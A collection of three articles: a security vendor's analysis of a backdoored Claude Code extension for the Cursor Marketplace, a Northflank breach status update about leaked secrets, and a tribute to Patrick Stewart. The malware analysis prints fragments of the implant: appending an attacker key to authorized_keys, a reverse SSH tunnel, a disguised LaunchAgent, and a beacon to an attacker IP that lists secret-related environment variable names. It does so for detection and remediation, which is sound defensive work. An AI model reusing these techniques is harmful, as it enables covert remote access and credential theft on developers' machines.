articles.title: Backdoor in Claude Code for VS Code extension on the Cursor Marketplace
articles.full_content:
TL;DR

Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.

Organisations should immediately review their environments for use of Claude Code for VSCode 

2.1.312
or 
2.1.313
and engage incident response where use of the extension is discovered.

Update (31 October 2026): Cursor’s security notice now identifies versions 

2.1.312
and 
2.1.313
distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only 
2.1.313
; the affected-version guidance below has been updated accordingly.

Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 

2.1.312
and 
2.1.313
, from its marketplace.

While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.

The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.

Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, 

systemsetup -getremotelogin
prints an administrator-access error and exits with status 
0
instead of returning 
Off
. Because the script only tries to enable SSH if the output matches 
Off
, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.

In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.

Infection Chain

The Cursor Marketplace Extension

The compromised 

extension.js
file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal 
activate
and 
deactivate
exports, and UI code.

The injected prefix pulls in standard Node.js modules (

child_process
, 
fs
, 
os
, 
path
, 
http
, and 
crypto
) and executes as soon as Node loads the file, before the extension’s normal 
activate
callback even runs. The user doesn’t need to interact with the extension for the payload to fire.

Stage 1 - Preparing SSH Access

First, the payload makes sure 

~/.ssh
exists and appends an attacker-controlled Ed25519 public key to 
~/.ssh/authorized_keys
, setting permissions to 
0700
on the directory and 
0600
on the file.

The key uses the comment 

svc-telemetry
. Before appending, the script checks whether 
svc-telemetry
is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.

      
var sd = path.join(HOME, ".ssh"),
    ak = path.join(sd, "authorized_keys");
// ...
if (cur.indexOf("svc-telemetry") < 0) {
  fs.appendFileSync(ak, PUB + "\n");
  d.sshKey = "added"
} else {
  d.sshKey = "present"
}

Here, 

cur
holds the existing contents of 
authorized_keys
, and 
PUB
is the embedded attacker public key (redacted here).

With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:

  • Linux: tries to enable and start 
    sshd
    or 
    ssh
    via 
    systemctl
    , falling back to 
    service
    and 
    /etc/init.d/
    .
  • macOS: checks Remote Login and, if it reports 
    Off
    , tries to enable it via 
    sudo -n systemsetup -setremotelogin on
    .
  • Windows: tries to install and start OpenSSH Server using PowerShell.

None of these steps include a privilege escalation exploit. Non-interactive 

sudo -n
will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.

It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (

det()
) that hardcodes 
/bin/sh
, which isn’t going to get very far on a standard Windows install.

A bug in the macOS SSH logic?

On macOS, the setup may run into problems before it even gets to the 

sudo
command. The script runs 
systemsetup -getremotelogin
without elevation and tests the output against 
/Off/i
. It only tries to enable Remote Login if the output contains 
Off
:

      
// ...
else if (PLAT === "darwin") {
  var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000);
  d.remoteLogin = rl;
  if (/Off/i.test(rl)) {
    det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1");
    d.remoteLoginOn = "tried"
  }
}

Notice that the second command (

-setremotelogin on
) uses 
sudo -n
, while the first command (
-getremotelogin
) doesn’t. When you run 
systemsetup -getremotelogin
as a standard user on macOS, you get this instead:

      
You need administrator access to run this tool... exiting!


    

systemsetup
refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 
0
. The malware’s 
ex()
helper grabs stdout and returns it:

      
function ex(c, t) {
  try {
    return cp.execSync(c, {
      timeout: t || 3000,
      stdio: ["ignore", "pipe", "ignore"],
      windowsHide: true
    }).toString().trim()
  } catch (e) {
    return ""
  }
}

Because the output is 

"You need administrator access to run this tool... exiting!"
, 
/Off/i.test(rl)
evaluates to 
false
.

As a result, the script skips the 

if
block and never runs 
sudo -n systemsetup -setremotelogin on
. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.

This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.

Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.

Stage 2 - Establishing the Reverse SSH Tunnel

Next, the script sets up an outbound SSH connection to 

134.209.82[.]225
as the 
tunnel
user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment 
svc-telemetry-tun
.

It’s worth keeping the two keys straight during an investigation:

  • The public key added to 
    ~/.ssh/authorized_keys
    (
    svc-telemetry
    ) lets the attacker log into the victim’s machine.
  • The embedded private key (
    svc-telemetry-tun
    ) lets the victim’s machine connect out to the attacker’s tunnel server.

The script writes this tunnel key to the OS temporary directory with a filename starting with 

.stk_
, followed by the first ten characters of the MD5 hash of the hostname and home directory path:

      
var kf = path.join(
  TMP,
  ".stk_" + crypto.createHash("md5")
    .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
);
// ...
var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'";

The tunnel uses 

-R *:0:localhost:22
for remote port forwarding. Passing 
0
asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to 
localhost:22
on the victim’s machine:

      
Affected host -- outbound SSH tunnel --> External SSH server

Operator -- separate connection --> Server's allocated port
                                            |
                                 Through the existing tunnel
                                            |
                                            v
                                  Affected host's SSH:22
                                            |
                                  Login using the planted key

Because the tunnel runs with 

-N
, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.

The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, 

known_hosts
is ignored, 
BatchMode
and 
IdentitiesOnly
are enabled, keepalives are set to 30 seconds (
ServerAliveCountMax=3
), and 
ExitOnForwardFailure
is turned on.

If 

autossh
is installed, the script uses it; otherwise it falls back to standard 
ssh
. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using 
pgrep
on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.

Stage 3 - Keeping Access Available

To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:

Platform Artifacts Persistence mechanism Notes
Linux 
~/.config/.smt
, 
~/.config/.smtk
 Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an 
@reboot
entry to the user’s crontab.		 Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).
macOS 
~/.config/.smt
, 
~/.config/.smtk
, 
~/Library/LaunchAgents/com.apple.sysmond.plist
 Writes a user LaunchAgent that runs 
/bin/sh ~/.config/.smt
with 
RunAtLoad
and 
KeepAlive
set to 
true
, then loads it via 
launchctl
.		 Runs in the user context rather than as a root LaunchDaemon.
Windows 
~/.config/smt.cmd
, 
~/.config/smtk
, 
%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd
 Tries to create a scheduled task named 
SysMon
running as 
SYSTEM
on startup. If that fails, drops 
sysmon.cmd
into the user’s Startup folder.		 Creating a 
SYSTEM
task requires admin privileges; the Startup folder fallback runs as the user at login.

On macOS and Linux, the 

~/.config/.smt
script has the tunnel private key embedded inside it and writes it out to 
~/.config/.smtk
before starting the reconnection loop.

On macOS, the LaunchAgent disguises itself as 

com.apple.sysmond.plist
inside 
~/Library/LaunchAgents/
:

      
<key>Label</key>
<string>com.apple.sysmond</string>
<!-- ... -->
<key>RunAtLoad</key>
<true/>
<key>KeepAlive</key>
<true/>

Stage 4 - Host Recon

Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:

  • Hostname, username, OS platform, and architecture
  • Home directory, current working directory, and global Git email (
    git config --global user.email
    )
  • Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)
  • Up to 40 environment variable names (not values) matching 
    /KEY|TOKEN|SECRET|PASS|AWS|GCP/i

The environment variable check uses 

Object.keys(process.env)
:

      
Object.keys(process.env)
  .filter(function(k) {
    return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k)
  })
  .slice(0, 40)

Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.

To get the machine’s public IP, the script queries 

ifconfig[.]me
, falling back to 
api[.]ipify[.]org
.

It then sends the JSON report via plaintext HTTP POST requests to 

/beacon
on both 
134.209.82[.]225:8099
and 
127.0.0.1:8099
:

      
var r = http.request({
  host: h,
  port: p,
  path: "/beacon",
  method: "POST",
  timeout: 3000,
  headers: {"content-type": "application/json"}
}, function(res) {
  res.resume()
});
// ...
r.write(JSON.stringify(d));
r.end()

Why it also sends a copy of the beacon to 

127.0.0.1:8099
isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.

The beacon is scheduled once with 

setTimeout
(1.5 seconds after the initial setup runs) and discards any HTTP response with 
res.resume()
. It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.

Detection Opportunities

From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.

SSH Key and Configuration Changes

Because the malware appends to 

~/.ssh/authorized_keys
directly using Node’s 
fs.appendFileSync
, process-only rules watching for shell commands like 
echo
or 
tee
touching 
authorized_keys
won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (
Code Helper
, 
Cursor Helper
, etc.) creating or writing to 
~/.ssh/authorized_keys
.

Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.

While you should also monitor for 

systemsetup -setremotelogin on
, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.

User LaunchAgent Persistence

The persistence setup on macOS gives us a couple of strong signals:

  • A non-Apple process writing a plist with a 
    com.apple.*
    label (
    ~/Library/LaunchAgents/com.apple.sysmond.plist
    ).
  • A LaunchAgent configured to execute 
    /bin/sh
    against a hidden script in the user’s home directory (
    ~/.config/.smt
    ).

Because the initial tunnel is spawned as a detached process and 

launchd
later manages 
.smt
directly, the subsequent 
ssh
processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of 
.smt
and 
com.apple.sysmond.plist
back to the IDE extension host makes it much easier to piece the chain together.

SSH Tunnels and Follow-On Access

On the process and network side, look for:

  • ssh
    or 
    autossh
    launched with remote port forwarding (
    -R *:0:localhost:22
    ) and identity files pulled from 
    /tmp/.stk_*
    or 
    ~/.config/.smtk
    .
  • Outbound SSH connections to 
    134.209.82[.]225
    on port 22, alongside HTTP POST requests to 
    134.209.82[.]225:8099
    (and connection attempts to 
    127.0.0.1:8099
    ).

If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from 

localhost
(
127.0.0.1
or 
::1
) authenticating with the 
svc-telemetry
key.

Remediation

If you identify an affected machine, uninstalling the extension alone won’t remove the backdoor. Make sure your response covers all of the stages it drops:

  • Kill active tunnel processes: Terminate the 
    /bin/sh
    retry loop and any 
    ssh
    or 
    autossh
    processes connecting to 
    134.209.82[.]225
    .
  • Remove persistence: Unload and delete 
    ~/Library/LaunchAgents/com.apple.sysmond.plist
    on macOS (or clean up the 
    @reboot
    cron entry on Linux / 
    SysMon
    scheduled task and Startup script on Windows), and remove 
    ~/.config/.smt
    and 
    ~/.config/.smtk
    .
  • Clean up SSH keys and state: Remove the 
    svc-telemetry
    public key from 
    ~/.ssh/authorized_keys
    , delete 
    /tmp/.stk_*
    , and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.
  • Rotate credentials: If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the 
    KEY|TOKEN|SECRET|PASS|AWS|GCP
    environment variable filter).

Phorion’s Approach

Phorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating 

com.apple.*
LaunchAgents and LaunchAgents executing shell scripts from hidden directories.

Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying 

~/.ssh/authorized_keys
directly, and Phorion Protections can be used to lock down 
~/.ssh/
so that only authorised processes can read or modify SSH keys and configuration files in the first place.

If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet, get in touch to arrange a demo.

articles.title: Northflank Breached
articles.full_content:
We have enabled audit logs for all customers, including free users.

Update · UTC

Users have reported unauthorised use of AI API keys supplied to the Northflank platform.

If you have not already rotated your user-provided secrets stored in Northflank, please do so immediately. Revoke existing credentials with their issuing providers, generate replacements, and update the affected secrets and workloads in Northflank. Review your AI provider usage and billing logs for unexpected activity, and report any suspicious usage to Northflank support and the relevant provider.

These reports may be consistent with the broader pattern of attacks targeting AI credentials. Similar IP addresses are contained in this article Wiz’s “Black October” report.

Update · UTC

Our investigation is ongoing. We have no further confirmed findings to share at this time.

Our guidance remains unchanged: assume all environment variables have been compromised and rotate all secrets and credentials immediately, including those in workloads, secret groups and global secrets. Disable public access to addons where enabled.

We will share further updates as more information is confirmed.

Update · UTC

Secret rotation on Postgres and MongoDB has been enabled for all users. We recommend disabling public expose on addons if you have enabled that.

All users should assume their environment variables are decrypted and begin rotation immediately.

Secrets on workloads

Secret groups

Global secrets

Multiple users are confirming that their AI keys have been used.

Identified · UTC

Assume all environment variables have been decrypted. Disable/rotate all keys.

articles.title: Through Captain Jean-Luc Picard, Patrick Stewart taught us the measure of a man
articles.full_content:
Patrick Stewart died yesterday, and for people of a certain age, a little bit of the future left with him.

For a certain, less-than-new generation of fans of Stewart’s 1990s television work on Star Trek: The Next Generation, there’s a sorrow that the man behind the larger-than-life Captain Jean-Luc Picard would be lost to a very real, very heartbreaking condition, Alzheimer’s and Lewy Body Dementia, according to his family.

Stewart, of course, was far more than Picard. He anchored the X-Men film franchise and was for decades a dynamo on stage. But there are reasons Captain Picard, commander of the Starship Enterprise, is the character he’s best known for. Over The Next Generation’s seven seasons, four movies, and a revival show —Star Trek: Picard — that ended just three years ago, he portrayed a model of what mature, responsible adulthood could look like for a generation of boys who were bookish, imaginitive, and maybe a little nerdy.

Two of the Globe’s dyed-in-the-wool Star Trek fans share what Captain Picard, and Patrick Stewart, meant to them.

John Hilliard: For a younger, and likely wiser generation, stanning a bald middle-aged English actor who played a French guy on a spaceship may be a questionable life choice. But here is the thing: What made Stewart resonate as Picard was how he rooted the character, as in the best of fairy tales, in emotional truth.

Jason Laughlin: I agree. Picard seemed as real as the complex characters that would start to populate prestige TV a decade later. But unlike anti-heroes such as Tony Soprano and Walter White, Stewart gave us a nuanced character we actually admired. He loved his job. He had passions like archaeology, Shakespeare, and music. He held to his ideals even when it meant terrible personal sacrifice.

In the mess of American politics over the past 20 years, there have been so many times I’ve longed for a Picard-style speech that makes right and wrong crystal clear.

“You know, there are some words I’ve known since I was a schoolboy,” Picard said when a Joe McCarthy-esque admiral began witch hunting on the Enterprise. “With the first link, the chain is forged. The first speech censured, the first thought forbidden, the first freedom denied, chains us all irrevocably.”

His character’s moral clarity, and Stewart’s conviction in delivering it, put an end to the admiral’s reign of terror. If only real world oppression could be dispelled so easily.

JH: Full disclosure: Star Trek is a show, which Youtube will prove, that leaned hard on latex foreheads and sometimes-flimsy production to tell stories of intergalactic scallywags known as Klingons and Borg, Romulans and Cardassians. Like free office coffee, it’s an acquired taste.

JL: One of my friends has a theory that if you didn’t get into Star Trek before you’re 18 years old, you’re never really going to get it.

To me, what’s so accessible, and radical, about Stewart, though, was his ability to convincingly portray vulnerability while still maintaining Picard as a credible leader.

One episode saw Picard return to his home village in France to heal from a traumatic assault.

At the conclusion, Stewart surrenders the control that was his character’s hallmark and falls into the mud, sobbing, over his failure to fight off his assailants. It’s a raw, real, depiction of a broken man. Stewart shifts from total collapse into slow recovery by reconciling with his brother. Grief is replaced by warmth, and Stewart sells it perfectly.

JH: Totally. He knew how to make that show work for him.

That’s despite an episode where he faces off against a giant, talking tar pit. Or the one where he sells eating a sandwich in the sci-fi version of the family station wagon. Or when he chugs Ecto Cooler (remember Ecto Cooler?) with a depressed Scotty, from the original Star Trek, and shares stories about first jobs and first girlfriends. He even shows up in tights, as discount Errol Flynn Robin Hood.

As a kid raised on television before there was an Internet, Stewart plugged into a world where figures like Mr. Rogers and Bob Ross presented a model for manhood that was gentle, patient, and a teacher. Stewart played Picard in a similar vein, basically everyone’s Space Dad.

JL: This is embarrassing, but the first TV episode that moved me to tears was from The Next Generation.

“The Inner Light” has Picard experience an entire lifetime as a different person on an alien planet. Again, the actor found his character’s humanity through slow revelation that perhaps a life with a wife and children is just as big an adventure as exploring space.

“Seize the time,” Picard says to his daughter in this other life. “Live now! Make now always the most precious time. Now will never come again.”

At the end of the episode, it’s revealed the decades he spent in that other life were an illusion he experienced in less than an hour. The only tangible thing he has from that world is a flute he learned to play in that other life. In the final moments, Picard plays it again, and without saying a word Stewart plays absolute heartbreak.

Seeing a strong, confident leader who was able to express regrets, sadness, and heartache left a lasting impression.

JH: Imagine you’re a kid watching TV, and you feel kind of alone, unsure of yourself. And then there’s Stewart, in full reassuring teaching mode. It’s the episode where Wil Wheaton’s character is struggling with tremendous guilt as he tries to hide his complicity in the death of a friend. Stewart, as Picard, is on to him.

Wheaton’s character, Wesley Crusher, is as close to a son as Picard will likely ever have, and Stewart leans into Picard’s grief, grief from knowing that doing the right thing will likely destroy the younger man’s future.

“A lie of omission is still a lie,” Picard tells Wheaton. Stewart’s voice cracks as Picard remembers meeting Wheaton’s character for the first time. He sat in Picard’s chair. He knew every button on the ship, every function. He was annoyed, Picard growls.

Stewart pulls back. Picard never had any doubt that Crusher would grow up into an outstanding officer. Until that moment.

“The first duty of every Starfleet officer is to the truth, whether it’s scientific truth, or historical truth, or personal truth,” says Picard, who then delivers the gut punch. “If you can’t find it within yourself to stand up and tell the truth about what happened, you don’t deserve to wear that uniform.”

It doesn’t matter if you know what a Starfleet is, or if someone can be an officer of one. Stewart always finds a way to connect his audience to the emotional truth.

When you’re a kid, you’re looking for lessons, even if you don’t want to admit it. Stewart, as a master of navigating the human heart, understood the moment and his character. Ultimately, Picard was a teacher, and a guide, not just for the characters with whom he shared a scene, but for the audience as well.

JL: Stewart was 47 when he began playing Picard. I’m just a year older than him now, and the very best of his episodes have taken on new resonance. Family tensions are real and devastating. Professional choices have lasting consequences. The melancholy of middle age lingers on the periphery of every happy moment.

Patrick Stewart’s Picard still serves as a role model. He showed how to face those moments with dignity, optimism, and a belief in the enduring capacity to be our best selves.
